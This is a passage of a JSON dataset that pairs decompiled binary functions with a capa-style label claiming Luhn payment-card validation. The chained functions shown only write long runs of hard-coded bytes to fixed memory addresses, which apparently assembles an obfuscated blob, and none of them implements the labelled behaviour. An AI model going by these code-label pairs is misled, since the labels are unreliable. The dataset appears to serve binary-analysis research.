*0x446318 = 0x5a;\n    *0x446319 = 0xd2;\n    *0x44631a = 0x75;\n    *0x44631b = 0x5d;\n    *0x44631c = 0x81;\n    *0x44631d = 0x56;\n    *0x44631e = 0x3e;\n    *0x44631f = 0x9d;\n    *0x446320 = 0x9d;\n    *0x446321 = 0xd4;\n    *0x446322 = 0x76;\n    *0x446323 = 0xb7;\n    *0x446324 = 0x7d;\n    *0x446325 = 0xab;\n    *0x446326 = 0x73;\n    *0x446327 = 0x99;\n    *0x446328 = 0x99;\n    *0x446329 = 0xfc;\n    *0x44632a = 0x6a;\n    *0x44632b = 0x39;\n    return param_1 + iVar1 + 0x13bea8;\n}\n",
        "token_count": 1279
    },
    "004098f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004098f0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409640(param_1);\n    *0x4456dc = 0x55;\n    *0x4456dd = 0x46;\n    *0x4456de = 0x86;\n    *0x4456df = 0x2f;\n    *0x4456e0 = 0x52;\n    *0x4456e1 = 0xcd;\n    *0x4456e2 = 0xcb;\n    *0x4456e3 = 0x60;\n    *0x4456e4 = 0xda;\n    *0x4456e5 = 0xbc;\n    *0x4456e6 = 0x84;\n    *0x4456e7 = 0xa7;\n    *0x4456e8 = 0x6b;\n    *0x4456e9 = 0x83;\n    *0x4456ea = 0x98;\n    *0x4456eb = 0x2d;\n    *0x4456ec = 0x77;\n    *0x4456ed = 0x24;\n    *0x4456ee = 0x23;\n    *0x4456ef = 0xee;\n    *0x4456f0 = 0xe4;\n    *0x4456f1 = 0xb7;\n    *0x4456f2 = 0xf7;\n    *0x4456f3 = 0x3c;\n    *0x4456f4 = 0x8d;\n    *0x4456f5 = 0xe7;\n    *0x4456f6 = 0x15;\n    *0x4456f7 = 0x3b;\n    *0x4456f8 = 0xbe;\n    *0x4456f9 = 0x73;\n    *0x4456fa = 0x38;\n    *0x4456fb = 0x66;\n    *0x4456fc = 0xbb;\n    *0x4456fd = 0xae;\n    *0x4456fe = 0x4b;\n    *0x4456ff = 9;\n    *0x445700 = 0x3a;\n    *0x445701 = 0xff;\n    *0x445702 = 0xee;\n    *0x445703 = 0xc6;\n    *0x445704 = 0xe5;\n    *0x445705 = 0x62;\n    *0x445706 = 0xf5;\n    *0x445707 = 0x10;\n    *0x445708 = 0xd9;\n    *0x445709 = 0xe5;\n    *0x44570a = 0xe9;\n    *0x44632c = 0x89;\n    *0x44632d = 0x30;\n    *0x44632e = 0xf9;\n    *0x44632f = 0x10;\n    *0x446330 = 0x8c;\n    *0x446331 = 0x6f;\n    *0x446332 = 0x9e;\n    *0x446333 = 0x9a;\n    *0x446334 = 2;\n    *0x446335 = 0x29;\n    *0x446336 = 0x3d;\n    *0x446337 = 0xd7;\n    *0x446338 = 0xf2;\n    *0x446339 = 0x91;\n    *0x44633a = 0x9e;\n    *0x44633b = 0xcd;\n    *0x44633c = 0x86;\n    *0x44633d = 0x1d;\n    *0x44633e = 0xed;\n    *0x44633f = 4;\n    *0x446340 = 0x89;\n    *0x446341 = 8;\n    *0x446342 = 0x38;\n    *0x446343 = 8;\n    *0x446344 = 0xf0;\n    *0x446345 = 0xd0;\n    *0x446346 = 0xf4;\n    *0x446347 = 0xeb;\n    *0x446348 = 0x4e;\n    *0x446349 = 0xb8;\n    *0x44634a = 0x79;\n    *0x44634b = 0xc1;\n    *0x44634c = 0x5e;\n    *0x44634d = 0x47;\n    *0x44634e = 0x82;\n    *0x44634f = 0x22;\n    *0x446350 = 0x7d;\n    *0x446351 = 200;\n    *0x446352 = 0xae;\n    *0x446353 = 0xab;\n    *0x446354 = 0x2d;\n    *0x446355 = 200;\n    *0x446356 = 1;\n    *0x446357 = 0x7c;\n    *0x446358 = 0x93;\n    *0x446359 = 0x9a;\n    *0x44635a = 99;\n    return param_1 + iVar1 + 0x1227c8;\n}\n",
        "token_count": 1249
    },
    "0040a640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040a640(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a390(param_1);\n    *0x4457c7 = 0x2c;\n    *0x4457c8 = 0x2f;\n    *0x4457c9 = 0x2d;\n    *0x4457ca = 0x8c;\n    *0x4457cb = 100;\n    *0x4457cc = 0x40;\n    *0x4457cd = 0xbc;\n    *0x4457ce = 0x34;\n    *0x4457cf = 0xe7;\n    *0x4457d0 = 0x3a;\n    *0x4457d1 = 0xfc;\n    *0x4457d2 = 0xda;\n    *0x4457d3 = 0x65;\n    *0x4457d4 = 0x55;\n    *0x4457d5 = 0xf8;\n    *0x4457d6 = 0xe4;\n    *0x4457d7 = 100;\n    *0x4457d8 = 0x41;\n    *0x4457d9 = 0xcf;\n    *0x4457da = 0x68;\n    *0x4457db = 0xbd;\n    *0x4457dc = 0x9f;\n    *0x4457dd = 0x34;\n    *0x4457de = 0xb4;\n    *0x4457df = 0x1e;\n    *0x4457e0 = 0x86;\n    *0x4457e1 = 0xee;\n    *0x4457e2 = 0xc6;\n    *0x4457e3 = 0x86;\n    *0x4457e4 = 0xff;\n    *0x4457e5 = 0x58;\n    *0x4457e6 = 0xd4;\n    *0x4457e7 = 0xcc;\n    *0x4457e8 = 0x8a;\n    *0x4457e9 = 0xe2;\n    *0x4457ea = 0xc6;\n    *0x4457eb = 0x19;\n    *0x4457ec = 0x97;\n    *0x4457ed = 0x8f;\n    *0x4457ee = 0xb6;\n    *0x4457ef = 0x69;\n    *0x4457f0 = 0xd;\n    *0x4457f1 = 0x75;\n    *0x4457f2 = 0x77;\n    *0x4457f3 = 0xe;\n    *0x4457f4 = 199;\n    *0x4457f5 = 0x41;\n    *0x446417 = 0x6f;\n    *0x446418 = 5;\n    *0x446419 = 0xe9;\n    *0x44641a = 0xd2;\n    *0x44641b = 0xae;\n    *0x44641c = 0xe9;\n    *0x44641d = 0xb;\n    *0x44641e = 0x2b;\n    *0x44641f = 1;\n    *0x446420 = 0xa9;\n    *0x446421 = 0x50;\n    *0x446422 = 0x5b;\n    *0x446423 = 0xd4;\n    *0x446424 = 0x16;\n    *0x446425 = 0x14;\n    *0x446426 = 0xb8;\n    *0x446427 = 0x19;\n    *0x446428 = 0xa6;\n    *0x446429 = 0x7c;\n    *0x44642a = 0x78;\n    *0x44642b = 0xc3;\n    *0x44642c = 0xf2;\n    *0x44642d = 0xee;\n    *0x44642e = 0x36;\n    *0x44642f = 0x4c;\n    *0x446430 = 0x39;\n    *0x446431 = 0x93;\n    *0x446432 = 0x74;\n    *0x446433 = 0x30;\n    *0x446434 = 0xdc;\n    *0x446435 = 0xdc;\n    *0x446436 = 0x13;\n    *0x446437 = 0x70;\n    *0x446438 = 0xe0;\n    *0x446439 = 0xfa;\n    *0x44643a = 0xdd;\n    *0x44643b = 0x10;\n    *0x44643c = 0x6f;\n    *0x44643d = 100;\n    *0x44643e = 0xfb;\n    *0x44643f = 0x99;\n    *0x446440 = 0x57;\n    *0x446441 = 0x55;\n    *0x446442 = 0x7f;\n    *0x446443 = 0x98;\n    *0x446444 = 0x8a;\n    *0x446445 = 0x4c;\n    return param_1 + iVar1 + 0x14cbef;\n}\n",
        "token_count": 1269
    },
    "0040a8f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040a8f0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a640(param_1);\n    *0x4457f6 = 0xb;\n    *0x4457f7 = 0x2e;\n    *0x4457f8 = 0x12;\n    *0x4457f9 = 0xb0;\n    *0x4457fa = 0x2b;\n    *0x4457fb = 0x40;\n    *0x4457fc = 0x30;\n    *0x4457fd = 0x16;\n    *0x4457fe = 0xc3;\n    *0x4457ff = 0x92;\n    *0x445800 = 0xd8;\n    *0x445801 = 0xdb;\n    *0x445802 = 0x74;\n    *0x445803 = 0xc6;\n    *0x445804 = 0xb3;\n    *0x445805 = 0xf9;\n    *0x445806 = 0x10;\n    *0x445807 = 0x50;\n    *0x445808 = 0xe1;\n    *0x445809 = 0x7f;\n    *0x44580a = 0x21;\n    *0x44580b = 0xf9;\n    *0x44580c = 0x72;\n    *0x44580d = 0x11;\n    *0x44580e = 0x62;\n    *0x44580f = 0x5f;\n    *0x445810 = 0xee;\n    *0x445811 = 0x66;\n    *0x445812 = 0x45;\n    *0x445813 = 0x73;\n    *0x445814 = 0xce;\n    *0x445815 = 200;\n    *0x445816 = 0x6b;\n    *0x445817 = 0xfa;\n    *0x445818 = 0;\n    *0x445819 = 0x98;\n    *0x44581a = 0x2f;\n    *0x44581b = 0xd;\n    *0x44581c = 0x66;\n    *0x44581d = 200;\n    *0x44581e = 0x1c;\n    *0x44581f = 0x9a;\n    *0x445820 = 0x57;\n    *0x445821 = 0x5f;\n    *0x445822 = 0x72;\n    *0x445823 = 0xe0;\n    *0x445824 = 0x1d;\n    *0x446446 = 0xdc;\n    *0x446447 = 0x1d;\n    *0x446448 = 0x9c;\n    *0x446449 = 0x8a;\n    *0x44644a = 0x69;\n    *0x44644b = 0x3c;\n    *0x44644c = 0x48;\n    *0x44644d = 0x97;\n    *0x44644e = 0xe1;\n    *0x44644f = 0x90;\n    *0x446450 = 0xec;\n    *0x446451 = 0xbe;\n    *0x446452 = 0xe6;\n    *0x446453 = 0xb3;\n    *0x446454 = 8;\n    *0x446455 = 0x8c;\n    *0x446456 = 0x79;\n    *0x446457 = 199;\n    *0x446458 = 0xc3;\n    *0x446459 = 0x55;\n    *0x44645a = 0x84;\n    *0x44645b = 0xf0;\n    *0x44645c = 0x66;\n    *0x44645d = 0xaf;\n    *0x44645e = 0x50;\n    *0x44645f = 0xd8;\n    *0x446460 = 0xde;\n    *0x446461 = 0xf5;\n    *0x446462 = 0xf;\n    *0x446463 = 0x2a;\n    *0x446464 = 0x3e;\n    *0x446465 = 0xc5;\n    *0x446466 = 0x54;\n    *0x446467 = 0x17;\n    *0x446468 = 0x3b;\n    *0x446469 = 0x83;\n    *0x44646a = 0x96;\n    *0x44646b = 0xd4;\n    *0x44646c = 0xaf;\n    *0x44646d = 0xd3;\n    *0x44646e = 0xb0;\n    *0x44646f = 0x1a;\n    *0x446470 = 0x17;\n    *0x446471 = 0x23;\n    *0x446472 = 100;\n    *0x446473 = 0xa4;\n    *0x446474 = 0x14;\n    return param_1 + iVar1 + 0x146d77;\n}\n",
        "token_count": 1227
    },
    "0040aba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040aba0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a8f0(param_1);\n    *0x445825 = 0xf8;\n    *0x445826 = 0xa5;\n    *0x445827 = 0xf6;\n    *0x445828 = 0x76;\n    *0x445829 = 0x43;\n    *0x44582a = 0xde;\n    *0x44582b = 0x45;\n    *0x44582c = 0x13;\n    *0x44582d = 0x82;\n    *0x44582e = 0x78;\n    *0x44582f = 9;\n    *0x445830 = 0x1c;\n    *0x445831 = 0xe;\n    *0x445832 = 0x83;\n    *0x445833 = 0xd4;\n    *0x445834 = 0xaa;\n    *0x445835 = 0xd0;\n    *0x445836 = 0x45;\n    *0x445837 = 0xb;\n    *0x445838 = 0x4b;\n    *0x445839 = 200;\n    *0x44583a = 0xb4;\n    *0x44583b = 0x67;\n    *0x44583c = 0x82;\n    *0x44583d = 0x89;\n    *0x44583e = 0xfe;\n    *0x44583f = 0x75;\n    *0x445840 = 0x44;\n    *0x445841 = 0xba;\n    *0x445842 = 1;\n    *0x445843 = 0x16;\n    *0x445844 = 0x7c;\n    *0x445845 = 0x97;\n    *0x445846 = 0xd3;\n    *0x445847 = 0;\n    *0x445848 = 0x87;\n    *0x445849 = 0x6e;\n    *0x44584a = 0x3b;\n    *0x44584b = 0x3b;\n    *0x44584c = 0xb9;\n    *0x44584d = 0x23;\n    *0x44584e = 0x36;\n    *0x44584f = 0xa5;\n    *0x445850 = 0xd7;\n    *0x445851 = 0xac;\n    *0x445852 = 0x74;\n    *0x445853 = 0x6f;\n    *0x446475 = 0x1f;\n    *0x446476 = 0xd3;\n    *0x446477 = 0xb4;\n    *0x446478 = 0xee;\n    *0x446479 = 0x3b;\n    *0x44647a = 7;\n    *0x44647b = 0x8f;\n    *0x44647c = 0xc;\n    *0x44647d = 0x2c;\n    *0x44647e = 0x6a;\n    *0x44647f = 0xfd;\n    *0x446480 = 0x7d;\n    *0x446481 = 0x6f;\n    *0x446482 = 0x4b;\n    *0x446483 = 0xca;\n    *0x446484 = 0x73;\n    *0x446485 = 0xc1;\n    *0x446486 = 0x60;\n    *0x446487 = 0x48;\n    *0x446488 = 0xc2;\n    *0x446489 = 0xa5;\n    *0x44648a = 0x3f;\n    *0x44648b = 0xca;\n    *0x44648c = 0x65;\n    *0x44648d = 0xe2;\n    *0x44648e = 0xe4;\n    *0x44648f = 0x2a;\n    *0x446490 = 0xfa;\n    *0x446491 = 2;\n    *0x446492 = 0x2e;\n    *0x446493 = 0x44;\n    *0x446494 = 0x41;\n    *0x446495 = 0xd4;\n    *0x446496 = 0x62;\n    *0x446497 = 0x78;\n    *0x446498 = 0xa1;\n    *0x446499 = 0xea;\n    *0x44649a = 0xa6;\n    *0x44649b = 0x2c;\n    *0x44649c = 0xa3;\n    *0x44649d = 0x1c;\n    *0x44649e = 0x87;\n    *0x44649f = 0x48;\n    *0x4464a0 = 0x75;\n    *0x4464a1 = 3;\n    *0x4464a2 = 0x74;\n    *0x4464a3 = 0xb9;\n    return param_1 + iVar1 + 0x13c573;\n}\n",
        "token_count": 1225
    },
    "0040b100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040b100(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040ae50(param_1);\n    *0x445883 = 0xd4;\n    *0x445884 = 0x19;\n    *0x445885 = 0xb2;\n    *0x445886 = 0xfb;\n    *0x445887 = 0x3d;\n    *0x445888 = 0x23;\n    *0x445889 = 0xfa;\n    *0x44588a = 0xdb;\n    *0x44588b = 0x2a;\n    *0x44588c = 0x15;\n    *0x44588d = 0xf2;\n    *0x44588e = 0xaf;\n    *0x44588f = 0xb8;\n    *0x445890 = 0xf5;\n    *0x445891 = 0xd0;\n    *0x445892 = 0x68;\n    *0x445893 = 0x58;\n    *0x445894 = 0xbe;\n    *0x445895 = 0x60;\n    *0x445896 = 0x29;\n    *0x445897 = 0x4f;\n    *0x445898 = 0xdc;\n    *0x445899 = 0x81;\n    *0x44589a = 0xcc;\n    *0x44589b = 0x35;\n    *0x44589c = 0xb3;\n    *0x44589d = 0xa7;\n    *0x44589e = 0x5b;\n    *0x44589f = 0x79;\n    *0x4458a0 = 0x19;\n    *0x4458a1 = 0x57;\n    *0x4458a2 = 0x97;\n    *0x4458a3 = 0xdb;\n    *0x4458a4 = 0xd7;\n    *0x4458a5 = 0xae;\n    *0x4458a6 = 0x75;\n    *0x4458a7 = 0xf1;\n    *0x4458a8 = 0x2d;\n    *0x4458a9 = 0xdb;\n    *0x4458aa = 0x9c;\n    *0x4458ab = 0xa3;\n    *0x4458ac = 0x4b;\n    *0x4458ad = 0xa0;\n    *0x4458ae = 0xe9;\n    *0x4458af = 0xaf;\n    *0x4458b0 = 0xd8;\n    *0x4458b1 = 0xd5;\n    *0x4464d3 = 0x8d;\n    *0x4464d4 = 0xfb;\n    *0x4464d5 = 0xa4;\n    *0x4464d6 = 0x1b;\n    *0x4464d7 = 0x82;\n    *0x4464d8 = 0xa0;\n    *0x4464d9 = 0xa8;\n    *0x4464da = 0x3a;\n    *0x4464db = 0x61;\n    *0x4464dc = 0xa1;\n    *0x4464dd = 0x52;\n    *0x4464de = 0xcf;\n    *0x4464df = 0x51;\n    *0x4464e0 = 0x6c;\n    *0x4464e1 = 0x7b;\n    *0x4464e2 = 0x8a;\n    *0x4464e3 = 0x80;\n    *0x4464e4 = 0x92;\n    *0x4464e5 = 0x42;\n    *0x4464e6 = 0x7e;\n    *0x4464e7 = 0x9f;\n    *0x4464e8 = 0x49;\n    *0x4464e9 = 0x8a;\n    *0x4464ea = 0xa4;\n    *0x4464eb = 0x61;\n    *0x4464ec = 0xeb;\n    *0x4464ed = 0x7a;\n    *0x4464ee = 0x57;\n    *0x4464ef = 0;\n    *0x4464f0 = 0x75;\n    *0x4464f1 = 0xfd;\n    *0x4464f2 = 0xd7;\n    *0x4464f3 = 0xb7;\n    *0x4464f4 = 9;\n    *0x4464f5 = 0x40;\n    *0x4464f6 = 0xc6;\n    *0x4464f7 = 0x49;\n    *0x4464f8 = 0x6c;\n    *0x4464f9 = 0x37;\n    *0x4464fa = 0xae;\n    *0x4464fb = 0x79;\n    *0x4464fc = 0x89;\n    *0x4464fd = 0x18;\n    *0x4464fe = 0x79;\n    *0x4464ff = 0x8f;\n    *0x446500 = 0xec;\n    *0x446501 = 0xde;\n    return param_1 + iVar1 + 0x1474ec;\n}\n",
        "token_count": 1298
    },
    "0040b3b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040b3b0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040b100(param_1);\n    *0x4458b2 = 0xec;\n    *0x4458b3 = 0x25;\n    *0x4458b4 = 0x6f;\n    *0x4458b5 = 0xe4;\n    *0x4458b6 = 0x68;\n    *0x4458b7 = 0xec;\n    *0x4458b8 = 0x1c;\n    *0x4458b9 = 0x4e;\n    *0x4458ba = 0xd6;\n    *0x4458bb = 0x3b;\n    *0x4458bc = 0xe4;\n    *0x4458bd = 0x25;\n    *0x4458be = 0xe2;\n    *0x4458bf = 0x21;\n    *0x4458c0 = 0x3b;\n    *0x4458c1 = 0x90;\n    *0x4458c2 = 0xec;\n    *0x4458c3 = 0xfe;\n    *0x4458c4 = 0x8b;\n    *0x4458c5 = 0x4a;\n    *0x4458c6 = 0x88;\n    *0x4458c7 = 7;\n    *0x4458c8 = 0xb4;\n    *0x4458c9 = 0x23;\n    *0x4458ca = 0xff;\n    *0x4458cb = 0xc6;\n    *0x4458cc = 0x86;\n    *0x4458cd = 0x7d;\n    *0x4458ce = 0xcd;\n    *0x4458cf = 0x98;\n    *0x4458d0 = 0x48;\n    *0x4458d1 = 0xd1;\n    *0x4458d2 = 0x21;\n    *0x4458d3 = 0x2e;\n    *0x4458d4 = 0x35;\n    *0x4458d5 = 0x28;\n    *0x4458d6 = 0x60;\n    *0x4458d7 = 0xc;\n    *0x4458d8 = 0xfa;\n    *0x4458d9 = 0xa2;\n    *0x4458da = 0xa1;\n    *0x4458db = 0xd;\n    *0x4458dc = 0x39;\n    *0x4458dd = 0xf2;\n    *0x4458de = 0x32;\n    *0x4458df = 0xdc;\n    *0x4458e0 = 9;\n    *0x446502 = 0xf7;\n    *0x446503 = 0xda;\n    *0x446504 = 0x48;\n    *0x446505 = 199;\n    *0x446506 = 0x5c;\n    *0x446507 = 0x28;\n    *0x446508 = 0xf2;\n    *0x446509 = 0xd6;\n    *0x44650a = 0xbf;\n    *0x44650b = 0x50;\n    *0x44650c = 99;\n    *0x44650d = 0x52;\n    *0x44650e = 0x9c;\n    *0x44650f = 0xa9;\n    *0x446510 = 0xb9;\n    *0x446511 = 0x45;\n    *0x446512 = 0x52;\n    *0x446513 = 0x90;\n    *0x446514 = 0x37;\n    *0x446515 = 0xfe;\n    *0x446516 = 0xa6;\n    *0x446517 = 0xe5;\n    *0x446518 = 0xc1;\n    *0x446519 = 0x90;\n    *0x44651a = 0x3e;\n    *0x44651b = 0x8f;\n    *0x44651c = 0x61;\n    *0x44651d = 0x50;\n    *0x44651e = 0x27;\n    *0x44651f = 0xf4;\n    *0x446520 = 0xc5;\n    *0x446521 = 0x5b;\n    *0x446522 = 0x50;\n    *0x446523 = 0x81;\n    *0x446524 = 0xbe;\n    *0x446525 = 0xe;\n    *0x446526 = 0xd;\n    *0x446527 = 0x28;\n    *0x446528 = 0xc2;\n    *0x446529 = 0x8c;\n    *0x44652a = 0x95;\n    *0x44652b = 0xdd;\n    *0x44652c = 0x6b;\n    *0x44652d = 0x3b;\n    *0x44652e = 0x84;\n    *0x44652f = 0x18;\n    *0x446530 = 0xf6;\n    return param_1 + iVar1 + 0x15086c;\n}\n",
        "token_count": 1275
    },
    "0040b650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040b650(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040b3b0(param_1);\n    *0x4458e1 = 0xdf;\n    *0x4458e2 = 0x12;\n    *0x4458e3 = 0x7c;\n    *0x4458e4 = 0x74;\n    *0x4458e5 = 0xc5;\n    *0x4458e6 = 0x75;\n    *0x4458e7 = 0xc1;\n    *0x4458e8 = 0xf8;\n    *0x4458e9 = 0x12;\n    *0x4458ea = 0x43;\n    *0x4458eb = 0xd5;\n    *0x4458ec = 6;\n    *0x4458ed = 0xca;\n    *0x4458ee = 0x99;\n    *0x4458ef = 0xb5;\n    *0x4458f0 = 0x86;\n    *0x4458f1 = 4;\n    *0x4458f2 = 0x47;\n    *0x4458f3 = 0xb1;\n    *0x4458f4 = 0x51;\n    *0x4458f5 = 0x6a;\n    *0x4458f6 = 0x51;\n    *0x4458f7 = 0xf0;\n    *0x4458f8 = 0xb5;\n    *0x4458f9 = 0xbd;\n    *0x4458fa = 0x6e;\n    *0x4458fb = 0xe9;\n    *0x4458fc = 0xf4;\n    *0x4458fd = 0x4e;\n    *0x4458fe = 0x8b;\n    *0x4458ff = 0xeb;\n    *0x445900 = 0xc6;\n    *0x445901 = 0x86;\n    *0x445902 = 0x49;\n    *0x445903 = 0x95;\n    *0x445904 = 0xd2;\n    *0x445905 = 0x5f;\n    *0x445906 = 0x7b;\n    *0x445907 = 0x5f;\n    *0x445908 = 0x39;\n    *0x445909 = 0xe9;\n    *0x44590a = 0xa9;\n    *0x44590b = 0x10;\n    *0x44590c = 0xc;\n    *0x44590d = 0xc6;\n    *0x44590e = 0x8f;\n    *0x44590f = 0x45;\n    *0x446531 = 0x47;\n    *0x446532 = 0x5a;\n    *0x446533 = 0x56;\n    *0x446534 = 0xc5;\n    *0x446535 = 0x1e;\n    *0x446536 = 0xfa;\n    *0x446537 = 0x98;\n    *0x446538 = 0xdd;\n    *0x446539 = 0xf3;\n    *0x44653a = 0x2b;\n    *0x44653b = 0xe3;\n    *0x44653c = 0x69;\n    *0x44653d = 0x3b;\n    *0x44653e = 0x1a;\n    *0x44653f = 0xbe;\n    *0x446540 = 0x35;\n    *0x446541 = 0x32;\n    *0x446542 = 0xd6;\n    *0x446543 = 0xb7;\n    *0x446544 = 0x34;\n    *0x446545 = 0x57;\n    *0x446546 = 0xd3;\n    *0x446547 = 0xde;\n    *0x446548 = 0xfb;\n    *0x446549 = 0xec;\n    *0x44654a = 0x68;\n    *0x44654b = 0x48;\n    *0x44654c = 0x43;\n    *0x44654d = 0x77;\n    *0x44654e = 0x51;\n    *0x44654f = 0x8e;\n    *0x446550 = 0x6b;\n    *0x446551 = 0x44;\n    *0x446552 = 0x2e;\n    *0x446553 = 0x4b;\n    *0x446554 = 0xf3;\n    *0x446555 = 0xe1;\n    *0x446556 = 1;\n    *0x446557 = 0xa2;\n    *0x446558 = 2;\n    *0x446559 = 0xa0;\n    *0x44655a = 0xb4;\n    *0x44655b = 0xb5;\n    *0x44655c = 0xe1;\n    *0x44655d = 0x18;\n    *0x44655e = 0x91;\n    *0x44655f = 0x2f;\n    return param_1 + iVar1 + 0x1578ed;\n}\n",
        "token_count": 1263
    },
    "0040b900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040b900(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040b650(param_1);\n    *0x445910 = 0xd1;\n    *0x445911 = 0xae;\n    *0x445912 = 0x9f;\n    *0x445913 = 0xf0;\n    *0x445914 = 2;\n    *0x445915 = 0xec;\n    *0x445916 = 0x7b;\n    *0x445917 = 0xd7;\n    *0x445918 = 0x8d;\n    *0x445919 = 0xdf;\n    *0x44591a = 0x7c;\n    *0x44591b = 0x11;\n    *0x44591c = 0x55;\n    *0x44591d = 0x7a;\n    *0x44591e = 0x2e;\n    *0x44591f = 0x8c;\n    *0x445920 = 0xaf;\n    *0x445921 = 0xc4;\n    *0x445922 = 0xd1;\n    *0x445923 = 0x8a;\n    *0x445924 = 0xe6;\n    *0x445925 = 0x59;\n    *0x445926 = 0xda;\n    *0x445927 = 0x1f;\n    *0x445928 = 0xb8;\n    *0x445929 = 0xe7;\n    *0x44592a = 0x6f;\n    *0x44592b = 0xb5;\n    *0x44592c = 0xd7;\n    *0x44592d = 0xb1;\n    *0x44592e = 0xef;\n    *0x44592f = 0x88;\n    *0x445930 = 0x69;\n    *0x445931 = 0x10;\n    *0x445932 = 0x68;\n    *0x445933 = 0x2b;\n    *0x445934 = 0x88;\n    *0x445935 = 0xed;\n    *0x445936 = 0x1f;\n    *0x445937 = 1;\n    *0x445938 = 0xc2;\n    *0x445939 = 0x48;\n    *0x44593a = 0xb;\n    *0x44593b = 0xc4;\n    *0x44593c = 0x9a;\n    *0x44593d = 0xb5;\n    *0x44593e = 0x5a;\n    *0x446560 = 0x7e;\n    *0x446561 = 0xa4;\n    *0x446562 = 200;\n    *0x446563 = 0xbb;\n    *0x446564 = 0xea;\n    *0x446565 = 0xe3;\n    *0x446566 = 0xed;\n    *0x446567 = 0x8b;\n    *0x446568 = 0xdc;\n    *0x446569 = 0x36;\n    *0x44656a = 0x77;\n    *0x44656b = 0xd2;\n    *0x44656c = 0x2b;\n    *0x44656d = 0x45;\n    *0x44656e = 0x42;\n    *0x44656f = 0x4a;\n    *0x446570 = 0x58;\n    *0x446571 = 0x7b;\n    *0x446572 = 0xe;\n    *0x446573 = 0xae;\n    *0x446574 = 2;\n    *0x446575 = 0x85;\n    *0x446576 = 0xfe;\n    *0x446577 = 0x41;\n    *0x446578 = 0x6f;\n    *0x446579 = 0xd7;\n    *0x44657a = 0x19;\n    *0x44657b = 0x46;\n    *0x44657c = 10;\n    *0x44657d = 0x27;\n    *0x44657e = 0xcc;\n    *0x44657f = 0x86;\n    *0x446580 = 0xdf;\n    *0x446581 = 0xf0;\n    *0x446582 = 0x66;\n    *0x446583 = 0xcd;\n    *0x446584 = 0x21;\n    *0x446585 = 0xf1;\n    *0x446586 = 0x9b;\n    *0x446587 = 0x6d;\n    *0x446588 = 0xa5;\n    *0x446589 = 0xab;\n    *0x44658a = 2;\n    *0x44658b = 0xba;\n    *0x44658c = 100;\n    *0x44658d = 0xe6;\n    *0x44658e = 0x98;\n    return param_1 + iVar1 + 0x1306cd;\n}\n",
        "token_count": 1209
    },
    "0040bbb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040bbb0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040b900(param_1);\n    *0x44593f = 1;\n    *0x445940 = 5;\n    *0x445941 = 0xd9;\n    *0x445942 = 0xeb;\n    *0x445943 = 0x9a;\n    *0x445944 = 0xef;\n    *0x445945 = 0xf1;\n    *0x445946 = 0xd2;\n    *0x445947 = 0x43;\n    *0x445948 = 0xb4;\n    *0x445949 = 0x4c;\n    *0x44594a = 0xd7;\n    *0x44594b = 6;\n    *0x44594c = 0xa7;\n    *0x44594d = 0xcc;\n    *0x44594e = 0xf7;\n    *0x44594f = 0xbf;\n    *0x445950 = 0x8e;\n    *0x445951 = 0x69;\n    *0x445952 = 0xe2;\n    *0x445953 = 0xa0;\n    *0x445954 = 0x23;\n    *0x445955 = 0xad;\n    *0x445956 = 0x7b;\n    *0x445957 = 0xae;\n    *0x445958 = 0x95;\n    *0x445959 = 0x39;\n    *0x44595a = 0x5c;\n    *0x44595b = 0x42;\n    *0x44595c = 5;\n    *0x44595d = 0x3f;\n    *0x44595e = 0x4f;\n    *0x44595f = 0x89;\n    *0x445960 = 9;\n    *0x445961 = 6;\n    *0x445962 = 0xd5;\n    *0x445963 = 5;\n    *0x445964 = 0x2d;\n    *0x445965 = 0x69;\n    *0x445966 = 0xa3;\n    *0x445967 = 10;\n    *0x445968 = 0x6d;\n    *0x445969 = 0x58;\n    *0x44596a = 0x20;\n    *0x44596b = 0x42;\n    *0x44596c = 0xbc;\n    *0x44596d = 0x56;\n    *0x44658f = 0x8c;\n    *0x446590 = 0xfd;\n    *0x446591 = 0x2c;\n    *0x446592 = 0x3a;\n    *0x446593 = 0xc0;\n    *0x446594 = 0x30;\n    *0x446595 = 0x4c;\n    *0x446596 = 0x2e;\n    *0x446597 = 0xb7;\n    *0x446598 = 100;\n    *0x446599 = 0xd9;\n    *0x44659a = 0x9b;\n    *0x44659b = 0xd5;\n    *0x44659c = 0x23;\n    *0x44659d = 0xa9;\n    *0x44659e = 0xc;\n    *0x44659f = 3;\n    *0x4465a0 = 0x99;\n    *0x4465a1 = 0x57;\n    *0x4465a2 = 0xf1;\n    *0x4465a3 = 0x2e;\n    *0x4465a4 = 0x18;\n    *0x4465a5 = 